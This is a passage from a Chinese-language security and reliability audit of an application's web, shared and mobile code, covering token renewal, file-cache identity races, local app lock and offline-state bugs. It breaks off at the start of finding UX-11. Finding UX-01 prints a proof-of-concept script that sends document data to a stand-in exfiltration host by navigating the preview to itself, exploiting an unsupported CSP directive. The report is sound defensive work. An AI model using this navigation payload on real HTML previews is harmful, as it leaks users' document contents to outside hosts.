# Web、Shared 与 Mobile 专题体检

检查日期：2026-09-08。代码基线：`main`，`a6b6865e`。本报告为只读审计结果和后续修复建议；本次没有修改产品实现，没有连接生产服务，没有构建或发布移动签名包。

## 1. 结论与阅读方法

当前项目在会话恢复、canonical identity、WebSocket 代际隔离、文件预览隔离、移动生产地址锁定、移动发布身份校验等方面已经有明显保障，不能按“没有鉴权、没有虚拟化、没有错误边界”的初级项目来评价。9 月 6–7 日记录过的 Web 前台刷新风暴、初始化假离线、业务步骤结束后仍转圈和 TodoWrite 最终答复缺失问题，当前代码已经包含针对性修正。

本次发现的主要风险集中在边界未完全收敛：同一身份的 token 续期被当成身份切换；移动原生文件下载尚未完整纳入身份和本地应用锁边界；Web 存储适配器的静默失败破坏上层认证事务的成功语义；管理页模块缓存会在当前页面 JavaScript 生命周期内固化一次预取结果，整页重载前无法正常重试；HTML 沙箱中禁止联网的声明强于浏览器实际保证。

其中，HTML 自导航请求、token 续期并发失败、移动文件缓存跨身份竞态、Web 权威 token 写入失败和移动文件名哈希碰撞均进行了不接触真实业务数据的受控验证。其余条目清楚区分源码可证的条件风险与需要真机、浏览器端到端验证的缺口。严重度表示潜在影响，证据状态表示我们实际证明到了哪一层，两者不能混同。

### 1.1 优先级清单

| ID    | 建议等级      | 证据状态                                   | 问题                                                             | 估算修复成本                     |
| ----- | ------------- | ------------------------------------------ | ---------------------------------------------------------------- | -------------------------------- |
| UX-01 | P1            | 已证实，真实 Chromium 隔离验证             | HTML 预览可自导航外传文档数据                                    | 2–5 人日，取决于是否保留任意脚本 |
| UX-02 | P1            | 已证实，实际 shared 实现在内存中复现       | 正常滑动续期让并发成功请求抛出身份变更错误                       | 1–2 人日                         |
| UX-03 | P1            | 已证实，实际缓存源码配内存原生适配器复现   | Mobile 文件缓存和在途下载跨身份复用                              | 2–4 人日                         |
| UX-04 | P1            | 源码确认；具体原生时序待真机验收           | 原生文件下载绕过本地应用锁传输门禁                               | 2–4 人日，与 UX-03 合并实施      |
| UX-05 | P1            | 已证实存储故障机制；完整 UI 影响有条件     | Web 权威身份存储写失败仍上报成功                                 | 1–2 人日                         |
| UX-06 | P1            | 源码确认的条件风险                         | 生物能力查询异常会撤掉已启用的本地应用锁                         | 1–2 人日，加真机矩阵             |
| UX-07 | P2            | 源码确认的条件风险                         | HTTP 探针缺少截止时间，恢复或解锁链可能长时间挂起                | 1–2 人日                         |
| UX-08 | P1/P2         | 源码确认；跨账号展示待端到端验证           | 管理页预取失败被固化为权限不足，缓存缺少身份隔离                 | 2–3 人日                         |
| UX-09 | P2            | 源码确认                                   | Mobile 把未知网络状态显示为确定离线                              | 0.5–1 人日                       |
| UX-10 | P2            | 源码确认的容量风险；未做目标设备性能跑分   | 顶层虚拟化不能限制单个巨大 AI 气泡的渲染成本                     | 2–5 人日                         |
| UX-11 | P2            | 源码确认的条件风险；原生回收行为待运行验收 | Mobile 消息错误边界不能随回收单元换数据重置                      | 0.5–1 人日                       |
| UX-12 | P2            | 源码确认，辅助技术体验待专项验收           | 部分标签页缺键盘协议，文件返回按钮无名称，原生锁屏背景未统一屏蔽 | 1–3 人日                         |
| UX-13 | P1 发布前门槛 | 明确未验证，不是“已发生故障”               | 移动真机、弱网、分享、最终签名制品验收仍有记录缺口               | 3–7 人日，设备与账号准备另计     |
| UX-14 | P2            | 源码确认的条件风险                         | 演示与 SystemPanel 的 CSP 注入仍保留旧实现                       | 0.5–1 人日                       |
| UX-15 | P2            | 源码确认的隐私与容量风险                   | Artifact 原生临时下载未纳入退出清理和缓存预算                    | 1–2 人日                         |
| UX-16 | P3            | 已证实                                     | 架构文档与实际 Web 托管/状态实现存在偏差                         | 0.5–1 人日                       |

成本是实现、针对性回归与一次审查的粗估，不是排期承诺。UX-03/04/15 适合组成一个文件传输与缓存专题，UX-02/05/08 适合组成一个身份和缓存专题；不要把所有问题塞进一个难以回滚的 PR。

## 2. 检查范围、方法和证据边界

已阅读根 `CLAUDE.md`、`docs/architecture/project-architecture.md`、移动本地锁验收说明和 iOS V1 发布说明，并沿以下实际调用路径排查：

- Web：`AuthGate → AuthContext → authFetch/tabScopedAuthStorage`；`preload → useSession/useUsers/useTenants`；`App → useAppLifecycle/useOnlineStatus`；`MessageList → renderModel/groupMessages/BusinessStepTimeline/DetailPanel`；HTML、Markdown、代码和 Artifact 预览。
- Shared：认证事务、请求身份隔离、WebSocket 连接与重试、实际供两端使用的 `useStreamWatchdog`、业务步骤状态与渲染投影、缓存 identity key。
- Mobile：认证与缓存清理、可信服务地址、原生安全存储、LocalAppLock、NetInfo 与前后台恢复、文件缓存与原生下载、消息列表 FlashList、消息错误边界、深链接和生产发布配置。

执行过的聚焦验证：

1. 用 Node 22.23.1 + `tsx` 直接调用 `shared/src/lib/authFetch.ts`，以 Map 和可控 Promise 代替存储与 HTTP；验证同身份 token 续期与并发业务响应。
2. 用仓库已有 Playwright 和本机 Chromium，在新建的无账号浏览器上下文中载入真实 `injectSandboxCsp` 结果；所有网络请求都由 route 拦截并中止，只有虚构的 `FAKE_AUDIT_MARKER`，没有向外部发送数据。
3. 将实际 `mobile/src/services/fileCacheService.ts` 转译后运行，Expo File/Directory 和 AsyncStorage 使用内存替身；控制下载完成的先后顺序，验证退出清理之后旧下载仍被新身份复用。
4. 对实际 `tabScopedAuthStorage.ts` 注入会抛 `QuotaExceededError` 的权威 tab storage 与可正常写入的 mirror storage；验证写入返回与实际读取身份不一致。
5. 用源码相同的 DJB2 算法验证两条不同文件路径得到同一文件名哈希。

未执行真实账号登录、生产接口调用、真实浏览器业务工作流、iOS/Android 真机、辅助技术遍历、网络劣化长跑和正式签名包检查。这里不能给出“生产已经泄露”“目标手机已卡死”“所有 UI 都通过无障碍标准”的结论。项目全量构建、测试和仓库级检查结果由主报告集中列示；本专题不重复虚构一套全量测试结果。

## 3. 已有保障与已排除的误报

| 领域             | 当前可见保障                                                                                                                                   | 本次结论                                                                                     |
| ---------------- | ---------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------- |
| Web 多标签账号   | `web/src/platform/tabScopedAuthStorage.ts:14` 开始定义 sessionStorage 权威、镜像仅用于新 tab 首次继承                                          | 正常存储下存在标签页隔离；不要重复报告“所有 tab 共用同一个 token 槽位”。异常写入另见 UX-05。 |
| 认证退出/登录    | `shared/src/lib/authLifecycle.ts:20` 定义 fence、断 WS、清队列、清游标、清缓存、删 token 的事务序列                                            | 已有日志和恢复设计；需要审查适配器是否把失败如实传回。                                       |
| 请求身份漂移     | `shared/src/lib/authFetch.ts:59` 比较请求代际、token 和 binding，并串行化凭据变更                                                              | 旧账号响应写回防护存在；同身份续期被误拒绝见 UX-02。                                         |
| 移动服务域       | `mobile/src/platform/mobileConfig.ts:71` 和 `trustedServiceOrigin.ts:161` 锁定生产 HTTPS/WSS、允许列表、origin 变化先失效会话                  | 未发现任意修改生产 API 域后直接复用 token 的旧型问题。                                       |
| Web 前台恢复     | `web/src/hooks/useAppLifecycle.ts:12` 的 3 秒宽限、30 秒 stale 门槛、合并恢复与代际检查                                                        | 旧的无差别全局 refreshAll 已收敛；探针截止时间仍需补足。                                     |
| Web 假离线       | `web/src/hooks/useOnlineStatus.ts:6` 明确使用 `boolean \| null`                                                                                | 已区分未知与确实离线；Mobile 仍有不同投影，见 UX-09。                                        |
| 步骤终态         | `BusinessStepDetailPanel.tsx:106` 传 `planClosed`，`:189` 使用共享 placeholder；移动详情 `BusinessStepDetailSheet.tsx:208`/`:214` 也传递关闭态 | 历史详情 spinner 缺口当前已修；不应再次作为未解决问题收费或排期。                            |
| 最终答复完整性   | `server/src/agent/descriptions/TodoWrite.md:21`、`:24`、`:25` 明确快照不等于交付、真实交互通道、最终答案独立完整                               | 当前指令已纠正历史信息交付冲突。仍需按产品输出质量持续抽样。                                 |
| Markdown/XSS     | `web/src/lib/markdownRuntime.ts:2` 使用 react-markdown，所见插件不含 `rehype-raw`；代码预览使用 highlighter 输出/HTML 转义                     | 不把 `dangerouslySetInnerHTML` 字样本身当成 XSS 证明。代码预览还已有 20 万字符高亮上限。     |
| HTML parent 隔离 | `HtmlPreviewPanel.tsx:149` 只开 `allow-scripts`，不同时开 `allow-same-origin`，普通预览不开 modal                                              | 无证据表明 HTML 能直接读父页面 token；网络外传文档内容是另一条边界，见 UX-01。               |
| 管理入口         | `useManagementSettingsAccess.ts:45` 核验 subject，`:48`–`:56` 核验四个精确 scoped decisions；旧 identity 或首次验证失败关闭入口                | 不应把同身份暂时网络错误时保留已验证入口误说成后端越权。后续 API 仍由服务端逐次授权。        |
| 消息容量         | Web 顶层最多 80 行，Mobile 已使用 FlashList；两端有渲染投影和缓存                                                                              | “完全没有虚拟化”不成立；单行无限放大仍是不同问题。                                           |
| 原生发布         | `mobile/app.config.js:20`–`:35` 从 release manifest 生成并校验配置；`mobile/app.json:65` 禁 Android backup                                     | 已有明确构建身份与权限配置；静态配置不能替代最终包、真机和商店资料验收。                     |

## 4. 详细发现

### UX-01 HTML 预览的“禁止联网”保证可被自导航突破

等级：P1。状态：已证实。影响范围：Web 工作区 HTML、Artifact HTML，以及使用同一 CSP 的其它脚本型预览。优先级：本专题第一批。成本：2–5 人日。

证据位置：`web/src/lib/htmlSandbox.ts:1`–`:16`；`web/src/components/HtmlPreviewPanel.tsx:147`；`web/src/components/artifacts/ArtifactContentViewer.tsx:110`。

代码设置 `connect-src 'none'` 并允许内联脚本，希望通过 `navigate-to 'none'` 禁止导航。实际 Chromium 不认识该指令。`sandbox="allow-scripts"` 能隔离源、禁止顶层导航，但允许 iframe 导航自身；这类导航并不等于 fetch/XHR，不受 `connect-src` 同样的限制。

受控复现使用真实 `injectSandboxCsp`，正文只有：

```html
<html>
  <body>
    <script>
      location.href = 'https://exfil.invalid/collect?report=FAKE_AUDIT_MARKER';
    </script>
  </body>
</html>
```

浏览器请求拦截观察到目标 URL；控制台输出 `Unrecognized Content-Security-Policy directive 'navigate-to'.`。所有请求在网络发送前被中止。规范维护仓库也记录了该指令从规范移除，不能将其视为产品的有效控制：[W3C CSP 维护记录](https://github.com/w3c/webappsec-csp/issues/608)。

触发前提是用户打开包含脚本的 HTML，其中脚本有恶意或来自受污染的生成输入。脚本无需突破 parent 同源隔离，只需读取自身已包含的订单、客户、经营等文档数据，将其编码到自导航 URL。我们证明的是浏览器会尝试该请求；没有证明攻击者可以读父页面 localStorage、绕过服务端文件鉴权或访问未被放入文档的数据。

建议方案：

1. 先明确 HTML 产品策略：若必须保证零外联，默认展示无脚本的安全静态预览；过滤可导航元素、meta refresh、危险 URL 与主动资源。移除 `allow-scripts` 可阻断本次脚本载荷，但单独这一步不能自动保证所有链接、meta refresh 都被禁用。
2. 对确实需要交互的可视化，优先使用受控组件/受限图表协议。任意 HTML + 任意 JS 的浏览器 iframe 不适合承诺绝对断网。若保留此能力，可使用真正关闭 egress 的独立渲染环境产出静态图/受控事件界面，或明确采用经用户选择的交互模式并评估其网络边界。
3. 保留不同源与 sandbox，作为保护父应用的独立防线；不要用“加 allow-same-origin 便于拦截脚本”解决，否则会引入更严重父页面访问风险。
4. 统一所有入口的策略与测试，包括打印临时 iframe、Artifact viewer、SystemPanel 和演示。打印用户授权只是打印许可，不是给正文脚本任意联网的许可。

验收：用 Chromium、Firefox、WebKit 拦截请求，覆盖 fetch、XHR、WebSocket、img、iframe、script、Worker、`location.href/replace`、meta refresh、用户点击链接与表单。零外联模式下不能出现外域请求；验证 parent DOM/token 仍不可读；正常静态报表、图表和打印各有样例；公开分享页复用同样规则。

### UX-02 正常 token 续期会让并发成功请求被错误判为身份变更

等级：P1。状态：已证实，直接执行真实 shared 实现。影响：Web 和 Mobile 的共享 HTTP 客户端。成本：1–2 人日。

证据：`shared/src/lib/authFetch.ts:59`–`:75`、`:115`–`:124`、`:159`–`:169`；服务端续期触发在 `server/src/auth/middleware.ts:145`–`:161`。

请求 A、B 同时读到 `old-token` 和同一 `authEpoch/generation`。A 先收到滑动续期 token 并写入存储。B 的服务端工作已经成功，甚至已经提交 POST 业务写入，但 B 返回时发现当前 token 字节不再等于请求初始 token，于是抛出 `AUTH_IDENTITY_CHANGED`。这并没有发生账号切换、退出或权限代际变更。

实际内存复现结果：

```text
read_result fulfilled
successful_write_result AUTH_IDENTITY_CHANGED
binding_unchanged {"authEpoch":1,"generation":1}
```

根因是把“凭据轮换版本”和“身份安全边界”绑定为一个等号。串行凭据写回防止了部分旧身份写回，却无法让本次同身份的另一个合法响应通过。已有 authFetch 测试覆盖了旧身份迟到响应和延迟 refresh 写入，但未覆盖这个并发正常续期时序。

二轮复核确认，上层已有的 `fenceAuthSideEffects()` 和认证 lifecycle 不会消除这个正常续期场景：服务端在 `middleware.ts:155`–`:156` 保留原 authEpoch/generation，而 shared 的刷新分支没有为同身份续期更新本地边界代际。第二个响应仍会单独命中 `currentToken !== token`。因此这里需要保留真实身份 fence、修正同身份轮换判断，不是补一套重复的登录/退出代际机制。

影响包括列表短暂加载失败、成功保存却显示失败、用户重试非幂等动作导致重复提交。并不是所有并发请求都会失败：必须有一次改变 token 字节的续期在另一请求身份核验前完成；同秒相同 JWT、返回顺序不同可能掩盖问题。

建议引入稳定的请求身份快照，包含 principal、认证 epoch、登录/退出本地 generation，而非仅用 token 字符串作为身份。同一稳定身份下允许 token 正常轮换；凭据写回采用 compare-and-swap 或单一 refresh 协调器，拒绝落后刷新覆盖较新凭据。不要删掉真实账号切换、撤销 epoch 和本地锁变化的 fence。业务响应可读性与刷新凭据副作用分别决定；不要对所有写请求自动重发。

验收至少覆盖两个并发 GET、GET+POST、两个不同签发时刻的 refresh、legacy token 升级、退出后 B 登录、403 USER_DISABLED 迟到、锁屏期间响应到达。所有同身份成功响应均可被调用方消费，真实身份越界仍被拒绝；已执行写请求不因 token 续期而重复发送。

### UX-03 Mobile 文件缓存的身份隔离和在途下载清理存在确定竞态

等级：P1。状态：服务实现已复现；实际 iOS/Android 文件 API 的落盘细节仍需真机确认。影响：同一安装内依次使用不同账号/组织的文件、KB 和附件流程。成本：2–4 人日。

证据：`mobile/src/services/fileCacheService.ts:39`–`:52`、`:139`–`:151`、`:176`–`:195`、`:253`–`:275`；退出确实调用清理，见 `mobile/src/contexts/AuthContext.tsx:141`–`:152`。调用入口包括 `mobile/app/files/preview.tsx:74`、`mobile/src/components/chat/blocks/FileDownloadCard.tsx:88`。

缓存 key 只有 path、可选 owner/root；KB key 只有 doc，没有 tenant。落盘名只有这个 key 的 32 位 DJB2 哈希。`inflight` 也按相同 key 共享。`clearAll()` 删除目录、清 index，却不失效/取消 `inflight`，也不使下载完成回调的旧身份失效。

可复现顺序：

1. A 在组织甲打开 `reports/shared.pdf`，下载仍在进行。
2. A 退出，认证事务执行 `fileCacheService.clearAll()`。
3. B 在组织乙登录，打开自己工作区同样的相对路径。
4. B 的调用命中 A 尚未完成的 `inflight`，等待同一个 Promise。
5. A 的下载完成，旧回调继续向当前 index 写入，A/B 两个调用得到同一 URI。

用实际源码与内存文件系统验证，只有一条携带虚构 `TOKEN_A` 的下载请求，两个调用返回同一个文件路径，读取内容均为 `PRIVATE_A`。真实移动文件系统在目录删除与下载完成间可能报错，也可能完成；无论哪种，代码没有把身份作为正确性边界，不能依赖某个 OS 恰好删除正在下载的文件来隔离账号。

上层并非没有清理：`mobile/app/_layout.tsx:44`–`:65` 按 tenant/user/generation 重建聊天及路由子树，`mobile/app/files/preview.tsx:84`、`:94`、`:118` 也用 cancelled 防止旧页面继续 setState。这些保护能阻止部分旧页面回调展示，却不会销毁 `fileCacheService` 模块单例及它的 inflight Map；B 新挂载的页面仍可能复用该 Promise。因此本条不依赖“A 的旧页面在退出后仍挂载”这一假设。

此外，不同路径 `reports/Aa.pdf` 与 `reports/B@.pdf` 均得到哈希 `wa8zgt`。index 虽有两个 key，本地文件名却相同，`idempotent: true` 下载可覆盖另一条目的文件。这是相同账号内也能触发的错误内容风险，不仅是大规模生日碰撞概率问题。

建议：缓存 key 至少包含 `origin/tenantId/userId/identityGeneration/resource/owner/root/path`，使用明确版本；磁盘子目录按身份与 generation 隔离，文件名使用抗碰撞摘要并验证 index 中原始 key。下载创建时捕获 identity，返回 URI/写 index/触发分享前重新核验；退出递增缓存 generation，清空 inflight 注册并尽可能取消原生任务，旧任务完成只能丢弃并清理临时文件。先下载到每次唯一临时路径，验证身份与结果后再原子提交到缓存。清理失败要可观测，不应声称 durable 清理成功。

验收：复现上述 A/B 同路径、不同 tenant 同名 KB、后台下载跨退出、退出中断重启、清理后迟到完成、同名并发、哈希冲突路径、磁盘满与系统清 cache。新身份读取旧内容、复用旧下载 Promise、旧回调重建新 index 均应为零。旧版未 scoped 的 index 只能安全失效，不可盲迁为新身份数据。

### UX-04 原生下载没有完整服从本地锁的敏感传输门禁

等级：P1 条件风险。状态：源码确认；未声称服务端鉴权被绕过。成本：与 UX-03 一起约 2–4 人日。

证据：`shared/src/lib/authFetch.ts:148` 拦截 `LOCAL_APP_LOCK_BLOCKED`；`mobile/src/contexts/LocalAppLockContext.tsx:45` 控制门禁与 WS；但 `mobile/src/services/fileCacheService.ts:155`–`:169`、`:231`–`:242` 直接读 token 并调用 `File.downloadFileAsync`。`mobile/src/platform/init.ts:10` 注入的 SecureStore 并无本地锁检查。`mobile/src/components/LocalAppLockGate.tsx:11` 保持背景页面挂载，offline shell 状态也继续允许页面交互。

可信 URL 校验只能证明 token 发往允许的服务，不能证明此时用户已经完成本地解锁和服务端重验。进入 offline shell 后网络重新可用但服务端身份尚未复核，用户从旧工作区文件卡下载时，这条原生路径仍可读出原 token 并进行网络请求；已有在途下载也没有门禁变化取消机制。

这与本地锁验收文档中“HTTP 敏感传输被阻断”的声明不一致。不能通过只禁发送按钮解决，因为文件预览、附件下载、分享、图片/媒体等其它入口也能触发原生请求。

建议建立统一的原生敏感传输入口：请求开始前同时校验 trusted origin、identity 和 local-lock access；捕获 token/binding；每个异步阶段核验 generation；锁定、退出、origin 改变时取消下载并阻止回调进入 UI。需要以签名 URL 下载 Artifact 时也应记录签发身份与消费代际，不能把“URL 有签名”当成“仍属于当前已解锁用户”。只读缓存命中可以按产品定义允许，但新联网必须等待 full access。

验收：锁定时直接调用下载服务应在读 token/调用原生下载前拒绝；offline shell 联网后但未重验时依然拒绝；背景→锁定→下载完成不得弹出分享；重新登录和成功重验后恢复正常。覆盖图片、PDF、KB、聊天附件、Artifact 和音视频，不能只验证 `authFetch`。

### UX-05 Web 权威身份存储写失败被静默吞掉，破坏认证事务

等级：P1 条件风险。状态：实际适配器故障复现。成本：1–2 人日。

证据：`web/src/platform/tabScopedAuthStorage.ts:94`–`:106`；`web/src/platform/webSecureStorage.ts:12`；`web/src/contexts/AuthContext.tsx:359`–`:371`、`:405`–`:416`；`shared/src/lib/authLifecycle.ts:168`–`:177`。

`write()` 尝试写 sessionStorage 失败后只 catch，不抛错，也没有切换到可信的内存存储或使旧身份失效；随后 mirror 可能成功。上层 `persistTokenAndBinding` 返回成功，认证事务安装新 UI 身份并解除 WS 发送冻结，但读取权威 token 仍可能返回旧值。解除冻结只表示允许连接/发送尝试，不代表服务端已认可新 UI 身份；服务端鉴权和 WS 身份核验仍可能随后拒绝并令界面退出。日志本身也通过同一静默接口写入，因此事务并不知道持久化没有完成。

受控结果为：

```text
write_returned_successfully: true
authoritative_token: TOKEN_A
mirror_token: TOKEN_B
```

触发条件是 sessionStorage 的启动探测及首次 `ensureBootstrapped()` 已成功，此后发生配额/访问异常，而 localStorage 仍可写；或权威存储与 mirror 都不可写却被当成成功。启动时即不可用或首次继承失败已有 `tab=null` 的 mirror 回退（`tabScopedAuthStorage.ts:67`–`:81`、`:132`–`:146`），不属于这里“仍从旧 tab 读取”的具体复现路径。正常浏览器存储下不会触发。显式切换账号最终有 `location.replace('/')`，可缩短部分错配窗口，但不能修复存储错误的成功语义；首次登录、刷新 token、journal 和其它无整页重载路径也使用此接口。

建议对身份、token、binding 和 auth journal 使用会报告失败的权威存储 API，mirror 的 best-effort 与权威写分开；认证事务在持久化失败后保持发送冻结、清 UI 身份，给可操作的“浏览器存储不可用”提示。若提供内存会话降级，必须以新的完整身份容器原子切换，不能读旧 token、写新 mirror 混用。多键更新使用一个整体版本化 record，或明确实现写后读取核验和回滚。删除凭据失败也不得返回“已完整清理”而不保留恢复状态。

验收：对每一步 token/binding/journal 写、读、删注入 quota/security 错误；模拟 mirror 成功而 tab 失败、tab 成功而 mirror 失败。只要返回登录成功，权威 readback 必须是同一个 principal/binding/token 组合。两个 tab 的正常隔离行为仍需保留。

### UX-06 已启用的本地锁会因生物能力检测故障被降为关闭

等级：P1 条件风险。状态：源码确定，实际触发频率未知。成本：1–2 人日和真机验收。

证据：`mobile/src/contexts/LocalAppLockContext.tsx:65`–`:75`。`availability()` 抛异常时被替换为 `{ supported: false, enrolled: false }`，随后 `enabled = !!policy && capability.supported && capability.enrolled`。即便磁盘里有有效 enabled policy，也会 dispatch configure disabled，并调用 `applyTransportGate(true)`。

触发场景是冷启动时硬件检测临时失败、系统生物录入变化、OS/OEM 行为差异。用户曾明确开启应用锁，应用却在无法确认生物能力时恢复完整界面和传输权限。这里并未窃取服务端 token，而是撤掉用户期望存在的本地保护。

这一判断限定于 `readLocalAppLockPolicy(identity)` 确实读到当前 identity 的有效 policy；policy 本来按 tenant/user/generation 隔离，退出也已有清理。该分支没有删除持久 policy，而是把当前运行期的 reducer 配置为 disabled/full（`shared/src/lib/localAppLock.ts:40`–`:44`）；以后重新初始化且检测恢复时可能重新启用。`biometricLocalAuth.ts:32`–`:36` 已允许设备密码 fallback，但此路径在调用 authenticate 之前就关闭本地锁，因此该已有 fallback 没有机会接管。

建议把“用户启用策略”和“当前可用验证手段”分开：有效 policy 一旦开启，不因一次 capability=false/异常自动关闭。检测不确定时继续锁定，显示重试、设备密码或重新登录；只有经有效验证的关闭操作才删除 policy。对确实不再支持生物识别的设备，可走系统设备凭据或重新登录回退，并清楚展示状态。policy 读取异常应有可恢复错误状态，避免既不允许进入、又没有可见恢复方式。

验收：policy 已启用时分别注入 availability reject、unsupported、enrolled=false、设备密码支持、一次失败后恢复；应始终不进入 full access，除非完成允许的验证。无 policy 的首次安装仍可正常进入。用户更换生物录入后要明确使用什么方式恢复访问。

### UX-07 恢复、启动和解锁探针缺少请求截止时间

等级：P2。状态：条件风险，源码确定。成本：1–2 人日。

证据：`web/src/hooks/useAppLifecycle.ts:94`；`web/src/hooks/useOnlineStatus.ts:20`；`web/src/lib/preload.ts:39`；`shared/src/hooks/useStreamWatchdog.ts:68`；`mobile/src/contexts/LocalAppLockContext.tsx:105`。

这些调用没有 AbortController 截止时间。前台恢复代码虽然有最多六次退避，但只有前一次 fetch reject 后才进入重试；如果连接建立后响应迟迟不结束，activeRecovery 保持占用，新恢复要求只是合并/排队。共享 watchdog 到点后同样先等待 HTTP，HTTP 本身若长时间挂起，watchdog 无法保证有限时间内收尾。本地生物验证成功后服务器验证挂起还会使 promptInFlight 长时间为 true。

这里不要求“任何健康检查非 2xx 都叫离线”。当前健康 HEAD 只证明 HTTP 可达，是合理分层；需要补的是时间边界与陈旧响应隔离。`useAppLifecycle` 在代际检查前发送 reachability 事件，也应确保旧周期晚到结果不会覆盖新网络事实。

建议创建带 timeout、外部 AbortSignal 合并和 deadline 分类的健康/认证验证 helper。建议的起始预算可为健康探针 5–10 秒、身份验证 10–15 秒，再按目标网络测量调整。timeout 进入 unknown/degraded 或可恢复失败，不应直接断言服务端运行已结束；watchdog 在探活不确定时保留“状态待确认”并允许继续对账。对 foreground generation、network generation、identity generation 在发送 reachability 事件前再做校验。

验收：连接成功但永不返回 headers、返回 headers 后 body 不结束、旧网络晚到成功/失败、连续网络切换、后台中止、真实 401 和本地锁场景。每个状态机在预算内达到可见可恢复状态，不保留无限等待 Promise 占有的恢复锁；不得靠用户刷新浏览器才能继续。

### UX-08 管理页将一次预取失败固化为权限不足，且内存缓存未按身份隔离

等级：P2 可靠性；跨身份数据残留分支按 P1 条件风险处理。状态：源码链已确认，完整页面复现待验收。成本：2–3 人日。

证据：`web/src/lib/preload.ts:100`–`:121`；`web/src/components/UserManager/hooks.ts:9`–`:58`；`web/src/components/TenantManager/hooks.ts:25`–`:99`；初次登录 `AuthContext.tsx:350`–`:380`，自动切换剩余账号 `:231`–`:271`。

管理预取 Promise 在模块加载时只运行一次。返回 null 有多种原因：页面打开时未登录、非管理员、网络失败、非 2xx。下游却把 null 在当前页面 JavaScript 生命周期内固化为“不是管理员”，设置 usersSkipped/tenantsSkipped；之后 refresh 直接跳过请求。整页重新加载能重建这些模块变量，因此它不是跨浏览器重启的永久权限变化。

常见路径是：未登录打开页面→模块预取归为 null→当前页面登录管理员，初次 activateAccount 不整页刷新→第一次使用用户/组织选择器时将 null 固化为 skipped。用户点击刷新也不会重新请求。预取时一次网络失败、后续网络恢复也会出现相同效果。

同时 cachedUsers/cachedTenants/sharedTenantsPreload 是模块变量，未包含 userId、tenantId、generation，也没有在认证退出清理中重置。显式 switchAccount 会整页 replace，能清掉该路径模块状态；但 `logoutCurrentAccount` 自动启用剩余账号没有同样的重载。旧账号已加载的数据可能继续作为下一身份组件初值。多个消费方还包括审计、组织分析、技能管理、Remote Hands 等，不能仅修改 UserManager 主表。

不能直接断言所有页面都会显示其它组织用户：有些调用方另有 tenantIdScope 过滤和 canonical 管理入口验证。可确认的是未 scoped 的内存源存在，跨身份无重载路径存在，需要以完整调用方矩阵验证实际暴露位置。后端写接口仍有独立授权。

二轮复核已确认 `UserManager/index.tsx:55` 和 `GovernanceAuditPanel.tsx:187`–`:189` 会按指定 tenant 过滤用户；普通 `authFetch` 也会在响应返回时拒绝旧身份请求。这些保护应保留。剩余缺口主要是已经进入模块缓存的旧数据，以及 `preload.ts:103`、`:118` 直接使用原生 fetch 的预取结果没有绑定请求身份；组件卸载再挂载也不会重建模块变量。不能把本条扩大为“所有管理响应都没有身份代际保护”。

建议让 preload 返回明确的 `{ status: success | denied | unauthenticated | error, identity, data }`；error/null 只表示没有可用预取，允许已认证身份重新请求。缓存按 principal/tenant/generation 分区并在 identity 变化时同步失效；请求捕获身份并 fence 迟到结果。不要将 endpoint 是否曾请求成功固化为当前页面生命周期内的权限判断，canonical management snapshot 才是入口展示依据。提供 error/retry，不显示“空列表”掩盖网络失败。

验收：匿名页登录平台 admin、匿名页登录 org admin、预取 500 后恢复、403 后权限授予、平台账号退出自动切到组织账号、组织 A 切 B、旧请求延迟返回。检查所有 useUsers/useTenants 消费者：展示只能来自当前 identity，错误后点击重试必须发生新请求。

### UX-09 Mobile 仍把 NetInfo 未知状态投影为“网络未连接”

等级：P2。状态：源码确认。成本：0.5–1 人日。

证据：`mobile/src/hooks/useOnlineStatus.ts:6`–`:12` 初始化 false，并把 null 映射 false；`mobile/src/components/ConnectionBanner.tsx:29`–`:50` 立即展示离线文案；对比 `mobile/src/platform/lifecycleAdapter.ts:14` 保留 null 和 Web `useOnlineStatus.ts:9` 的三态。

冷启动或 NetInfo 尚未确定 internet reachability 时，连接可能正常但 banner 已显示明确离线。它还是 accessibility alert，辅助技术可能播报一次错误状态。这与已修 Web 假离线行为不一致。

建议保留 `boolean | null`，仅 false 展示“网络未连接”，null 可静默或使用中性“正在检查连接”。发送/重连是否允许仍由 canonical lifecycle 的 fail-closed 门禁决定；UI 不显示离线并不意味着解除网络门禁。

验收：NetInfo 首次 null→true 期间不闪离线；null→false 后正确显示；联网但服务不可达与 OS 断网使用相应状态；锁屏/后台恢复不重复错误播报。修改文案或 Maestro 断言时遵守已有证据夹具更新流程，但不把当前文案锁定注释当成拒绝修复语义的理由。

### UX-10 顶层虚拟化无法限制单个巨大 AI 气泡的渲染成本

等级：P2 容量风险。状态：结构已确认，实际卡顿阈值待目标设备测量。成本：2–5 人日。

证据：Web `messageVirtualizer.ts:6` 将限制明确为 top-level rows；`groupIntoBubbles.ts:27`–`:48` 把一轮连续 AI 项累积到同一气泡；`MessageList.tsx:758`–`:772` 对整个气泡渲染 BusinessStepTimeline。Mobile `MessageList.tsx:303` 将 `group.items` 全部 map 到 MessageItemView，外层 `:654` 才是 FlashList。

因此，80 个顶层行或 FlashList 并不意味着最多渲染 80 个消息块。一个长运行生成大量普通文本、工具可见项、结构化步骤，或者一个特别长的最终 Markdown，可以集中在一个 row 中。该 row 一旦进入视口，内部内容全部挂载。Mobile 还将步骤 process 节保留在主时间线，部分长运行会比 Web 详情折叠模式挂载更多内容。

此外两端 messages 变化后仍需进行分组、主线程投影和气泡构造；大量历史数据加流式尾部更新时，应测 CPU 和引用复用，不能仅通过 DOM 行数门槛判断流式性能。Web 代码预览已有高亮字符上限，值得复用此类有依据的预算，而非统一再引入重量级依赖。

建议先建立两类基准：多短会话轮次、单超长运行。记录单轮 block 数、文本字节数、实际 mounted block 数、React commit duration、主线程 long tasks、峰值内存、滚动位置误差和 Mobile dropped frames。随后按结果考虑把气泡分成有稳定 key 的视觉连续子行，步骤过程按展开范围挂载，长 Markdown 按稳定段落分块或在预算外使用全文查看器。避免每个流 token 重新解析已经结束的整个答案。

验收建议采用 50/500/5000 blocks、普通表格/大表格、长公式、长代码、增量 token、历史向前翻页的组合。阈值需由产品目标设备明确，而非把本机快电脑的结果写成全端保证。性能改造不得破坏最终回答、真实审批、分页锚点或业务步骤结果。

### UX-11 Mobile 消息错误边界缺少随 item 变化的恢复机制

等级：P2 条件风险。状态：源码确认；FlashList 在目标版本上的完整复现待补。成本：0.5–1 人日。

